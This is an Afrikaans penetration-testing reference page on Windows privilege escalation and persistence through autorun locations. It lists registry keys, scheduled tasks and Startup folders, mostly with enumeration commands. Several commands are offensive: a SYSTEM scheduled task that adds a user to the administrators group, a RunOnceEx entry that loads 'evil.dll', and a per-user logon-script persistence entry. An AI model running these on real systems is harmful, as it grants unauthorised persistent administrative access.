# Privilege Escalation met Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** kan gebruik word om programme tydens **startup** uit te voer. Sien watter binaries geprogrammeer is om tydens startup uitgevoer te word met:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geskeduleerde Take

**Take** kan geskeduleer word om met **sekere frekwensie** te loop. Kyk watter binaries geskeduleer is om te loop met:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Vouers

Alle binaries wat in die **Startup-vouers** geleë is, sal tydens startup uitgevoer word. Die algemene startup-vouers is dié wat hieronder gelys word, maar die startup-vouer word in die registry aangedui. [Lees dit om uit te vind waar.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **Ter inligting**: *path traversal*-kwesbaarhede tydens argiefekstraksie (soos dié wat in WinRAR voor 7.13 misbruik is – CVE-2025-8088) kan gebruik word om **payloads direk binne hierdie Startup-vouers te plaas tydens dekompressie**, wat tot code execution tydens die volgende gebruikersaanmelding lei. Vir ’n diepgaande bespreking van hierdie tegniek, sien:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Register

> [!TIP]
> [Nota vanaf hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Die **Wow6432Node**-registerinskrywing dui aan dat jy ’n 64-bis Windows-weergawe gebruik. Die bedryfstelsel gebruik hierdie sleutel om ’n afsonderlike aansig van HKEY_LOCAL_MACHINE\SOFTWARE vir 32-bis-toepassings wat op 64-bis Windows-weergawes loop, te vertoon.

### Runs

**Algemeen bekende** AutoRun-register:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registersleutels bekend as **Run** en **RunOnce** is ontwerp om programme outomaties uit te voer elke keer wanneer ’n gebruiker by die stelsel aanmeld. Die command line wat as ’n sleutel se datawaarde toegeken word, is beperk tot 260 karakters of minder.<sup>[[2]](#references)</sup>

**Service runs** (kan outomatiese opstart van services tydens boot beheer):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Op Windows Vista en latere weergawes word die **Run**- en **RunOnce**-registersleutels nie outomaties gegenereer nie. Inskrywings in hierdie sleutels kan programme direk begin of dit as dependencies spesifiseer. Om byvoorbeeld ’n DLL-lêer tydens aanmelding te laai, kan ’n mens die **RunOnceEx**-registersleutel saam met ’n "Depend"-sleutel gebruik. Dit word gedemonstreer deur ’n registerinskrywing by te voeg om "C:\temp\evil.dll" tydens die stelsel se opstart uit te voer:<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: As jy binne enige van die genoemde registry binne **HKLM** kan skryf, kan jy privileges eskaleer wanneer 'n ander gebruiker aanmeld.

> [!TIP]
> **Exploit 2**: As jy enige van die binaries wat in enige van die registry binne **HKLM** aangedui word, kan oorskryf, kan jy daardie binary met 'n backdoor wysig wanneer 'n ander gebruiker aanmeld en privileges eskaleer.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Shortcuts wat in die **Startup**-folder geplaas word, sal outomaties veroorsaak dat services of applications tydens user logon of system reboot geloods word. Die ligging van die **Startup**-folder word in die registry gedefinieer vir beide die **Local Machine**- en **Current User**-scopes. Dit beteken dat enige shortcut wat by hierdie gespesifiseerde **Startup**-liggings gevoeg word, sal verseker dat die gekoppelde service of program ná die logon- of reboot-proses begin, wat dit ’n eenvoudige metode maak om programme te skeduleer om outomaties te loop.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> As jy enige \[User] Shell Folder onder **HKLM** kan oorskryf, sal jy dit na ’n folder onder jou beheer kan wys en ’n backdoor kan plaas wat uitgevoer sal word wanneer enige user by die system aanmeld, wat privileges eskaleer.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Hierdie per-gebruiker-registerwaarde kan na ’n script of command verwys wat uitgevoer word wanneer daardie gebruiker aanmeld. Dit is hoofsaaklik ’n **persistence**-primitive omdat dit slegs binne die konteks van die geaffekteerde gebruiker uitgevoer word, maar dit is steeds die moeite werd om tydens post-exploitation- en autoruns-oorsigte na te gaan.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> As jy hierdie waarde vir die huidige gebruiker kan skryf, kan jy uitvoering by die volgende interactive logon weer aktiveer sonder admin-regte. As jy dit vir ’n ander gebruiker se hive kan skryf, kan jy code execution verkry wanneer daardie gebruiker aanmeld.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notas:

- Verkies volledige paaie na `.bat`, `.cmd`, `.ps1`, of ander launcher-lêers wat reeds deur die teikengebruiker gelees kan word.
- Dit bly voortbestaan ná afmeld/herbegin totdat die waarde verwyder word.
- Anders as `HKLM\...\Run`, verleen dit nie op sigself elevation nie; dit is persistence op gebruikersvlak.

### Winlogon-sleutels

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Tipies is die **Userinit**-sleutel op **userinit.exe** gestel. As hierdie sleutel egter gewysig word, sal die gespesifiseerde executable ook deur **Winlogon** geloods word wanneer die gebruiker aanmeld. Net so is die **Shell**-sleutel bedoel om na **explorer.exe** te wys, wat die verstek shell vir Windows is.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> As jy die registerwaarde of die binary kan oorskryf, sal jy voorregte kan eskaleer.

### Beleidsinstellings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Gaan die **Run**-sleutel na.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Verandering van die Safe Mode-opdragprompt

In die Windows-register onder `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` is daar ’n **`AlternateShell`**-waarde wat by verstek op `cmd.exe` gestel is. Dit beteken dat `cmd.exe` gebruik word wanneer jy tydens opstart "Safe Mode with Command Prompt" kies (deur F8 te druk). Dit is egter moontlik om jou rekenaar so op te stel dat dit outomaties in hierdie modus begin sonder dat jy F8 hoef te druk en dit handmatig te kies.

Stappe om ’n boot-opsie te skep wat outomaties in "Safe Mode with Command Prompt" begin:<sup>[[5]](#references)</sup>

1. Verander die eienskappe van die `boot.ini`-lêer om die leesalleen-, stelsel- en versteekte vlae te verwyder: `attrib c:\boot.ini -r -s -h`
2. Maak `boot.ini` oop vir redigering.
3. Voeg ’n reël soos die volgende in: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Stoor die veranderinge aan `boot.ini`.
5. Pas die oorspronklike lêereienskappe weer toe: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Deur die **AlternateShell**-registersleutel te verander, kan ’n pasgemaakte command shell opgestel word, wat moontlik vir ongemagtigde toegang gebruik kan word.
- **Exploit 2 (PATH Write Permissions):** As jy skryftoestemmings op enige deel van die stelsel se **PATH**-veranderlike het, veral voor `C:\Windows\system32`, kan jy ’n pasgemaakte `cmd.exe` uitvoer, wat ’n backdoor kan wees indien die stelsel in Safe Mode begin word.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Skryftoegang tot `boot.ini` maak outomatiese Safe Mode-opstart moontlik, wat ongemagtigde toegang tydens die volgende herlaai kan fasiliteer.

Gebruik die volgende commands om die huidige **AlternateShell**-instelling na te gaan:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Geïnstalleerde komponent

Active Setup is 'n kenmerk in Windows wat **begin voordat die werkskermomgewing volledig gelaai is**. Dit prioritiseer die uitvoering van sekere opdragte, wat moet voltooi voordat die gebruiker se aanmelding voortgaan. Hierdie proses vind plaas selfs voor ander opstartinskrywings, soos dié in die Run- of RunOnce-registerafdelings, geaktiveer word.

Active Setup word deur die volgende registersleutels bestuur:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Binne hierdie sleutels bestaan verskeie subsleutels, wat elkeen met 'n spesifieke komponent ooreenstem. Sleutelwa waardes van besondere belang sluit die volgende in:

- **IsInstalled:**
- `0` dui aan dat die komponent se opdrag nie uitgevoer sal word nie.
- `1` beteken dat die opdrag een keer vir elke gebruiker uitgevoer sal word. Dit is die verstekgedrag indien die `IsInstalled`-waarde ontbreek.
- **StubPath:** Definieer die opdrag wat deur Active Setup uitgevoer moet word. Dit kan enige geldige opdragreël wees, soos om `notepad` te begin.

**Sekuriteitsinsigte:**

- Die wysiging of skryf na 'n sleutel waar **`IsInstalled`** op `"1"` gestel is met 'n spesifieke **`StubPath`**, kan tot ongemagtigde command execution lei, moontlik vir privilege escalation.
- Die wysiging van die binêre lêer waarna enige **`StubPath`**-waarde verwys, kan ook privilege escalation bewerkstellig, mits voldoende toestemmings beskikbaar is.

Om die **`StubPath`**-konfigurasies oor Active Setup-komponente te inspekteer, kan die volgende opdragte gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Oorsig van Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) is DLL-modules wat ekstra funksies by Microsoft se Internet Explorer voeg. Hulle laai met elke aanvang in Internet Explorer en Windows Explorer. Hulle uitvoering kan egter geblokkeer word deur die **NoExplorer**-sleutel op 1 te stel, wat voorkom dat hulle saam met Windows Explorer-instansies laai.<sup>[[1]](#references)</sup>

BHO's is versoenbaar met Windows 10 via Internet Explorer 11, maar word nie in Microsoft Edge, die verstekblaaier in nuwer weergawes van Windows, ondersteun nie.

Om BHO's wat op ’n stelsel geregistreer is te ondersoek, kan jy die volgende registry-sleutels inspekteer:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Elke BHO word deur sy **CLSID** in die registry voorgestel, wat as ’n unieke identifiseerder dien. Gedetailleerde inligting oor elke CLSID kan gevind word onder `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Vir die navraag van BHO's in die registry kan die volgende commands gebruik word:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer-uitbreidings

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Let daarop dat die registry 1 nuwe registry-inskrywing vir elke dll sal bevat, en dit sal deur die **CLSID** voorgestel word. Jy kan die CLSID-inligting in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` vind.

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open-opdrag

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Uitvoeringsopsies vir beeldlêers
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Let daarop dat al die werwe waar jy autoruns kan vind, **reeds deur**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **gesoek is**. Vir ’n **meer omvattende lys van lêers wat outomaties uitgevoer word**, kan jy [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)van systinternals gebruik:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Meer

**Vind meer Autoruns soos registers in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## Verwysings

- [1] [Algemene malware-persistentiemeganismes](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart-kategorieë (Probleemoplossing met die Windows Sysinternals Tools, 2de uitgawe)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Hoe kan ek 'n boot-opsie byvoeg wat 'n alternatiewe shell begin?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit Wrap-Up 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)

{{#include ../../banners/hacktricks-training.md}}
